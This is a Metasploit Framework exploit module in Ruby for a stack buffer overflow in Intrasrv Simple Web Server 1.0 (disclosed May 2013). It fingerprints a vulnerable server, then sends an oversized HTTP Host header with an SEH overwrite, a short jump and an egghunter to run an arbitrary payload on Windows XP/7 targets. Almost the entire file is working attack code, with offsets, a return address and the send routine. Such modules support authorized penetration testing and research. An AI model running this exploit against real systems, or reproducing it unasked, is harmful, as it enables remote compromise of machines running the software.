##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Egghunter

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Intrasrv 1.0 Buffer Overflow",
      'Description'    => %q{
        This module exploits a boundary condition error in Intrasrv Simple Web
        Server 1.0. The web interface does not validate the boundaries of an
        HTTP request string prior to copying the data to an insufficiently large
        buffer. Successful exploitation leads to arbitrary remote code execution
        in the context of the application.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'xis_one', # Discovery, PoC
          'PsychoSpy <neinwechter[at]gmail.com>' # Metasploit
        ],
      'References'     =>
        [
          ['OSVDB', '94097'],
          ['EDB','18397'],
          ['BID','60229']
        ],
      'Payload'        =>
        {
          'Space' => 4660,
          'StackAdjustment' => -3500,
          'BadChars' => "\x00"
        },
      'DefaultOptions'  =>
        {
          'ExitFunction' => "thread"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['v1.0 - XP / Win7',
            {
              'Offset' => 1553,
              'Ret'    => 0x004097dd #p/p/r - intrasrv.exe
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "May 30 2013",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptPort.new('RPORT', [true, 'The remote port', 80])
        ], self.class)
  end

  def check
    begin
      connect
    rescue
      print_error("Could not connect to target!")
      return Exploit::CheckCode::Safe
    end
    sock.put("GET / HTTP/1.0\r\n\r\n")
    res = sock.get_once

    if res =~ /intrasrv 1.0/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    # setup egghunter
    hunter,egg = generate_egghunter(payload.encoded, payload_badchars, {
      :checksum=>true
    })

    # setup buffer
    buf = rand_text(target['Offset']-126)         # junk to egghunter at jmp -128
    buf << hunter                                 # egghunter
    buf << rand_text(target['Offset']-buf.length) # more junk to offset
    buf << "\xeb\x80" + rand_text(2)              # nseh - jmp -128 to egghunter
    buf << [target.ret].pack("V*")                # seh

    # second last byte of payload/egg gets corrupted - pad 2 bytes
    # so we don't corrupt the actual payload
    egg << rand_text(2)

    print_status("Sending buffer...")
    # Payload location is an issue, so we're using the tcp mixin
    # instead of HttpClient here to maximize control over what's sent.
    # (i.e. no additional headers to mess with the stack)
    connect
    sock.put("GET / HTTP/1.0\r\nHost: #{buf}\r\n\r\n#{egg}\r\n\r\n")
    disconnect
  end
end
